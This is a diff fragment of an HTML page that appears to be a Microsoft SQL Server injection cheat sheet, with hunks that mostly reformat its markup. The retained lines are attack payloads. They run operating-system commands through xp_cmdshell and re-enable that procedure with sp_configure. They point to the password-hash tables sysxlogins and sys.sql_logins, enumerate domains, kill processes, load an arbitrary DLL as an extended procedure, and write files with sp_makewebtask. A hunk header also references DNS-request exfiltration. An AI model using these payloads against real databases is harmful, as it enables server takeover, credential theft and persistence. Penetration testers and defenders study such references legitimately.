@@ -197,8 +197,6 @@ Make DNS Requests &#09;declare @host varchar(800); select @host = name FROM mast
 Command Execution* &#09;EXEC xp_cmdshell ‘net user’; — privOn MSSQL 2005 <ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&nbsp; you may need to reactivate xp_cmdshell first as it’s disabled by default:</li>
 <li style="list-style-type: none">&nbsp; &nbsp;EXEC sp_configure ‘show advanced options’, 1; — priv</li>
 <li style="list-style-type: none">&nbsp; &nbsp;RECONFIGURE; — priv</li>
-<li style="list-style-type: none">&nbsp; &nbsp;EXEC sp_configure ‘xp_cmdshell’, 1; — priv</li>
-<li style="list-style-type: none">&nbsp; &nbsp;RECONFIGURE; — priv</li>
 </ul>
 </li>
 </ul>
@@ -247,9 +245,9 @@ Databases &#09;&#09;&#09;northwind<ul><li style="list-style-type: none"><ul><li 
 </ul>
 </li>
 </ul>
-Some Special Tables&#09;&#09;master..sysmessages -Error Messages <ul>&nbsp;&#09;&#09;&#09;&#09;</ul>
-master..sysservers -Linked Servers <ul>&nbsp;&#09;&#09;&#09;&#09;</ul>
-masters..sysxlogins &nbsp;-SQL Server 2000: Password<br/>
+Some Special Tables&#09;&#09;master..sysmessages -Error Messages <br/>
+&nbsp;&#09;&#09;&#09;&#09;master..sysservers -Linked Servers <br/>
+&nbsp;&#09;&#09;&#09;&#09;masters..sysxlogins &nbsp;-SQL Server 2000: Password<br/>
 &nbsp;&#09;&#09;&#09;&#09;&#09;sys.sql_logins -SQL Server 2005 : Password<br/>
 More Stored Procedures<br/>
 Cmd Execute&#09;&#09;&#09;exec master..xp_cmdshell 'dir'<br/>
@@ -291,7 +289,7 @@ Domain Enumeration &#09;xp_ntsec_enumdomains<br/>
 Process Killing (need PID) &#09;xp_terminate_process<br/>
 Add new procedure virtually <br/>
 you can execute whatever <br/>
-you want&#09;&#09;&#09;&#09;sp_addextendedproc 'xp_webserver', 'c:\temp\x.dll' <ul>&nbsp;&#09;&#09;&#09;&#09;</ul>
-exec xp_webserver<br/>
+you want&#09;&#09;&#09;&#09;sp_addextendedproc 'xp_webserver', 'c:\temp\x.dll' <br/>
+&nbsp;&#09;&#09;&#09;&#09;exec xp_webserver<br/>
 Write text file to a UNC or <br/>
 an internal path &#09;&#09;sp_makewebtask</body></html>
